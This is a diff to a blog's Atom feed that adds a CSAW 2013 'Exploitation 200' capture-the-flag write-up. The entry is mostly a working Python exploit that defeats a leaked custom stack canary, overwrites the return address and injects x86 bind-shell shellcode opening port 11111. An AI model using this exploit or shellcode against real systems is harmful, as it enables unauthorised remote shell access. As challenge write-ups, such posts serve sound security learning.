@@ -4,7 +4,7 @@
   <title><![CDATA[Category: CSAW | ejohn]]></title>
   <link href="http://ejohn.github.io/blog/categories/csaw/atom.xml" rel="self"/>
   <link href="http://ejohn.github.io/"/>
-  <updated>2013-09-23T18:05:16-04:00</updated>
+  <updated>2013-09-23T19:03:15-04:00</updated>
   <id>http://ejohn.github.io/</id>
   <author>
     <name><![CDATA[ejohn]]></name>
@@ -12,6 +12,76 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[CSAW 2013: Exploitation 200]]></title>
+    <link href="http://ejohn.github.io/blog/2013/09/23/csaw-2013-exploitation-200/"/>
+    <updated>2013-09-23T18:28:00-04:00</updated>
+    <id>http://ejohn.github.io/blog/2013/09/23/csaw-2013-exploitation-200</id>
+    <content type="html"><![CDATA[<p>This level 200 challenge has a very obvious buffer overflow vulnerability but with a little twist, the devious geniuses at ISIS labs implemented their own custom stack canary buffer overflow protection! Well given that it is a 200 level challenge they made things a lot easier by sending us the canary value used and the address of the buffer on the stack. With these two values in hand its a straight forward buffer overflow exploit.</p>
+
+<h3>Exploit</h3>
+
+<p>```python
+import socket
+import struct
+import time</p>
+
+<p>def pack(addr):</p>
+
+<pre><code>return struct.pack('&lt;I', addr)
+</code></pre>
+
+<p>def unpack(addr):</p>
+
+<pre><code>return struct.unpack('&lt;I', addr)
+</code></pre>
+
+<p>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((&lsquo;127.0.0.1&rsquo;, 31338))</p>
+
+<h1>Receive the address of the buffer on the stack</h1>
+
+<p>buffer_address = s.recv(5)
+buffer_address = unpack(buffer_address[0:4])[0]</p>
+
+<h1>Calculate the offset from the start of the buffer to the location of the shellcode.</h1>
+
+<h1>Padding: 2048, Canary: 4, Padding: 12, EIP: 4, NOP sled + payload</h1>
+
+<h1>Jump to the middle of the NOP sled</h1>
+
+<p>offset = (2048 + 4 + 12 + 4 + 16)</p>
+
+<p>shellcode_addr = buffer_address + offset
+shellcode_addr = pack(shellcode_addr)</p>
+
+<h1>Receive the canary.</h1>
+
+<p>canary = s.recv(4)</p>
+
+<p>s.recv(1024)</p>
+
+<h2><a href="http://www.shell-storm.org/shellcode/files/shellcode-836.php">http://www.shell-storm.org/shellcode/files/shellcode-836.php</a></h2>
+
+<h2>Bind shell on port 11111</h2>
+
+<p>payload = ( &ldquo;\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a\x02&rdquo;</p>
+
+<pre><code>        "\x89\xe1\xcd\x80\x5b\x5e\x52\x66\x68\x2b\x67"
+        "\x6a\x10\x51\x50\xb0\x66\x89\xe1\xcd\x80\x89"
+        "\x51\x04\xb0\x66\xb3\x04\xcd\x80\xb0\x66\x43"
+        "\xcd\x80\x59\x93\x6a\x3f\x58\xcd\x80\x49\x79"
+        "\xf8\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62"
+        "\x69\x6e\x89\xe3\x41\xcd\x80")
+</code></pre>
+
+<p>s.send(&ldquo;A&rdquo;<em>2048 + canary + &ldquo;AAAABBBBCCCC&rdquo; + shellcode_addr + &ldquo;\x90&rdquo;</em>64 +payload)</p>
+
+<p>s.close()
+```</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[CSAW 2013: Exploitation 300]]></title>
